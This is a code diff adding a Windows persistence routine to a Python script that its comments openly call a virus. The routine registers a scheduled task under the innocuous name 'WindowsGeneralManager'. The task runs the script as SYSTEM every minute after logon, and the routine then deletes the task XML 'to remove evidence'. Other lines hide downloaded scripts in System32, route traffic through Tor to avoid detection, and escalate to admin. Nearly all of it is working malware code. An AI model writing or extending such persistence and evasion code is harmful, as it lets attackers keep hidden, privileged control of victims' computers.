@@ -10,6 +10,7 @@ from zipfile import ZipFile # to deal with zip files
 ZIP_URL = 'http://127.0.0.1:8000/scripts' # the url from which the zip containing the scripts will be downloaded
 ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
 TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
+TaskName = 'WindowsGeneralManager'
 
 scripts_paths = [] # the paths of the scripts
 
@@ -57,8 +58,116 @@ def start_scripts():
             except: # if one of the scripts fail to run for any reason
                 pass
 
-def make_renewable(): # makes the script start with admin privileges every time the computer is restarted
-    pass
+def make_renewable(py, platform): # makes the script start with admin privileges every time the computer is restarted
+    if platform == 'win':
+        Command = 'python' if py else __file__  # execute the file, with python if needed
+        Arguments = __file__ if py else ''
+        WorkingDirectory = __file__.replace(fr'\{os.path.basename(__file__)}', "")  # make the current directory the working directory
+        # the task file config
+        XML_STARTUP = \
+fr'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>false</Enabled>
+      <Delay>PT5S</Delay>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>SYSTEM</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>{Command}</Command>
+      <Arguments>{Arguments}</Arguments>
+      <WorkingDirectory>{WorkingDirectory}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>'''
+        XML_Logon = \
+fr'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <Delay>PT5S</Delay>
+      <Repetition>
+        <Interval>PT1M</Interval>
+        <Duration>PT24H</Duration>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>SYSTEM</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>{Command}</Command>
+      <Arguments>{Arguments}</Arguments>
+      <WorkingDirectory>{WorkingDirectory}</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>'''
+        with open(f"{TaskName}.xml", "w") as f:  # make the config file
+            f.write(XML_Logon)
+        # The command to register the task that will automatically rerun this script on every logon
+        cmd = ['schtasks',  # Call task scheduler
+               '/Create',  # Tell it you're trying to make a task
+               '/TN', TaskName,  # Specify the name of the task
+               '/XML', f'{TaskName}.xml',  # Tell it to import the task xml
+               '/RU', 'SYSTEM',  # Specify that the user making the task is SYSTEM for highest privileges
+               '/F']  # force override if already exists to avoid any errors
+        subprocess.run(cmd)  # register the task
+        os.remove(f'{TaskName}.xml')  # delete the file to remove evidence
+    elif platform == 'linux':
+        pass
+    else: # MacOS (darwin)
+        pass
 
 def make_path_list():
     with open(scripts_direc+'list','w') as f:
@@ -72,6 +181,7 @@ def load_paths():
         f.close()
         return paths
 
+
 if 'win' in sys.platform: # check if win in sys.platform and not win == sys.platform because sys.platform might be win32 or win64 which work the same for this script
     scripts_direc = (r'C:\Windows\System32\WXR')  # the directory where the script will hide new files
     started_file = r'C:\Windows\log-olr'  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
@@ -80,13 +190,13 @@ if 'win' in sys.platform: # check if win in sys.platform and not win == sys.plat
 elif 'linux' == sys.platform:
     scripts_direc = ('')  # the directory where the script will hide new files
     started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
-    check_admin()
-    get_admin()
+    if not check_admin(True):
+        get_admin(True)
 elif 'darwin' == sys.platform:
     scripts_direc = ('')  # the directory where the script will hide new files
     started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
-    check_admin()
-    get_admin()
+    if not check_admin(True):
+        get_admin(True)
 else:
     # -- delete all evidence of the virus --
     sys.exit() # stop the script
